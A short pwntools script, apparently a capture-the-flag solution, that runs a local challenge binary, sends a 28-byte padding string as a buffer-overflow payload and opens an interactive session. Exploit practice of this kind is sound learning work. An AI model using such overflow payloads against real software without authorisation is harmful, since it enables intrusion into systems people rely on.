from pwn import *

p = process('./chall')

payload = 'A' * 28

p.sendline(payload)
p.interactive()